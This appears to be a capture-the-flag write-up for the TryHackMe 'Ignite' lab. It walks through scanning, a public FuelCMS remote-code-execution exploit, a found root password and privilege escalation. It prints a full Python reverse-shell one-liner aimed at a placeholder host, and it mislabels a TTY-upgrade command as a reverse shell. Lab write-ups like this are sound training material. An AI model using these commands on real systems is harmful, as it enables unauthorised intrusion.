# -THM-Ignite

First we define the IP
```
IP=xx.xx.xxx.xxx
```
## Nmap Scan
I started analyzing the environment using __`nmap`__  to discover open ports 

```
nmap -sV -sC -oN nmap_scan $IP
```

> - `-sV`: Detect service/version
> - `-sC`: Run default scripts
> - `-oN`: Output to file (normal format)


![image](https://github.com/user-attachments/assets/28b25ad2-3fba-4565-aa47-b692a18629fc)


We see that port `80 (HTTP)` is open

![image](https://github.com/user-attachments/assets/18981159-98b3-4af3-8d62-11df3f5328ac)

I use __searchsploit__ to see if it is any exploit for __Fuel__
![image](https://github.com/user-attachments/assets/1e03874b-e81c-4f21-8b83-fe983a387058)

Let s try code execution ... , I found an exploit on GitHub , let s try it 
```
git clone https://github.com/p0dalirius/CVE-2018-16763-FuelCMS-1.4.1-RCE.git 
```
Nice , we got shell and we are __www-data__

![image](https://github.com/user-attachments/assets/58ba6690-9b13-4deb-9701-3fe9ccb599e4)

# And we get the first flag : user.txt 
![image](https://github.com/user-attachments/assets/cbad5042-3eb8-422a-956d-00a95edc9ca5)

I asked ChatGPT to give me a command for a reverse shell:
```
python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

```
After this I put an nc to listen on 4444 and try it 


![image](https://github.com/user-attachments/assets/e968b8b6-b98e-484c-863f-c6410c5179f9)


Some research and I find this: 

![image](https://github.com/user-attachments/assets/1039832d-7f28-4e1d-a73a-fd300b90cc73)

Lets check it in -> 

```
/var/www/html/fuel/application/config
```

![image](https://github.com/user-attachments/assets/ff7c490c-3ad7-4c34-8e0a-ce4bf4c22586)

and we find the password for root 

![image](https://github.com/user-attachments/assets/3e00a449-1e15-4ac4-bc27-cdee8b918bf1)

I run a reverse shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
```

# And we get the second flag : root.txt

![image](https://github.com/user-attachments/assets/02e81c60-b9ae-4456-8351-0d084ff0f1bb)


